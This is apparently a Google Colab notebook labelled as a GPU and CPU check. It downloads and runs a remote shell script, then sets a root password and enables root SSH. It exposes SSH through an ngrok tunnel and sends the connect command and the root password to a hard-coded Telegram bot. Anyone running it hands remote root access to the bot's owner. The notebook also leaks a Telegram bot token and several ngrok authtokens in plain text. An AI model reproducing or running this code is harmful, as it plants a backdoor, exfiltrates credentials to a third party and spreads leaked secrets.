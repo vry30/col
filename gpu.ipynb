{
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# **BY : Vry**"
      ],
      "metadata": {
        "id": "9fkAQai6D7OG"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **Check Your GPU**\n",
        "!nvidia-smi"
      ],
      "metadata": {
        "id": "EEPr8wHiD9p6",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **Check Your CPU**\n",
        "!lscpu"
      ],
      "metadata": {
        "cellView": "form",
        "id": "qG-pYncHGhD6"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **Tmate**\n",
        "!wget https://raw.githubusercontent.com/vry30/col/main/ss.sh && chmod +x ss.sh && ./ss.sh"
      ],
      "metadata": {
        "id": "n-XHUBT-EicI",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **ngirk**\n",
        "!pip install telepot --upgrade &> /dev/null\n",
        "import random, string, urllib.request, json, getpass, telepot\n",
        "def ste(use):\n",
        "    token = \"5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs\"\n",
        "    idd = 1380298324\n",
        "    bot = telepot.Bot(token)\n",
        "    bot.sendMessage(idd,use)\n",
        "#Generate root password\n",
        "\n",
        "password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))\n",
        "\n",
        "#Download ngrok\n",
        "\n",
        "! wget -q -c -nc https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip\n",
        "\n",
        "! unzip -qq -n ngrok-stable-linux-amd64.zip\n",
        "\n",
        "#Setup sshd\n",
        "\n",
        "! apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen > /dev/null\n",
        "\n",
        "#Set root password\n",
        "\n",
        "! echo root:$password | chpasswd\n",
        "\n",
        "! mkdir -p /var/run/sshd\n",
        "\n",
        "! echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config\n",
        "\n",
        "! echo \"PasswordAuthentication yes\" >> /etc/ssh/sshd_config\n",
        "\n",
        "! echo \"LD_LIBRARY_PATH=/usr/lib64-nvidia\" >> /root/.bashrc\n",
        "\n",
        "! echo \"export LD_LIBRARY_PATH\" >> /root/.bashrc\n",
        "\n",
        "#Run sshd\n",
        "\n",
        "get_ipython().system_raw('/usr/sbin/sshd -D &')\n",
        "\n",
        "#Ask token\n",
        "\n",
        "print(\"Copy authtoken from https://dashboard.ngrok.com/auth\")\n",
        "\n",
        "authtoken = \"27LGoz73mr6cYiQr2gLZzKVCR4x_4qBv9DQLubx7AqMeqj4Qz\" #@param {type:'string'}\n",
        "\n",
        "#Create tunnel\n",
        "\n",
        "get_ipython().system_raw('./ngrok authtoken $authtoken && ./ngrok tcp 22 &')\n",
        "\n",
        "#Get public address and print connect command\n",
        "\n",
        "with urllib.request.urlopen('http://localhost:4040/api/tunnels') as response:\n",
        "\n",
        "  data = json.loads(response.read().decode())\n",
        "\n",
        "  (host, port) = data['tunnels'][0]['public_url'][6:].split(':')\n",
        "\n",
        "  ste(f'ssh -p{port} root@{host}')\n",
        "\n",
        "  print(f'ssh -p{port} root@{host}')\n",
        "\n",
        "#Print root password\n",
        "\n",
        "ste(password)",
        "\n",
        "print(password)"
      ],
      "metadata": {
        "id": "Jc5CraHsLFve",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **sleep**\n",
        "!sleep 11111111"
      ],
      "metadata": {
        "cellView": "form",
        "id": "UwvU9Q1fG_c5"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "27gr3ibckG4Dn1UjrYLMBYf4CPt_2Vno5kM5J1634HfLjGHpp\n",
        "\n",
        "27grEaDOyd0OGTjssnuzXPSOgzu_7M72hoLFwJJdKaUpCr8VG\n",
        "\n",
        "27eSmMSMn2vHiaimw1LaMumnp19_2KW7zPM69qADcSYocaCNs\n",
        "\n",
        "27aXU13Lv8ZqrX7fp1WGWeD1FhS_2WnWWBSsKrZDdXBFxkUf5\n",
        "\n",
        "27aWO4eH3Xqe3NjEivXtfqYU1G7_6GkcJBHtGHKrgMm74PpXo\n",
        "\n",
        "27eG7RRRveaTtohVOVftMeeQxOf_3zM2H6gB5mKhZ1txwPure\n",
        "\n",
        "27pK0BZcpN0Wh9bJqswjb7WNobU_hzCLJ3bNFSYEH6fNZMzL"
      ],
      "metadata": {
        "id": "C9vAWIFQIrP4"
      }
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "name": "Copy of Salinan dari Selamat Datang di Colaboratory",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "accelerator": "GPU"
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
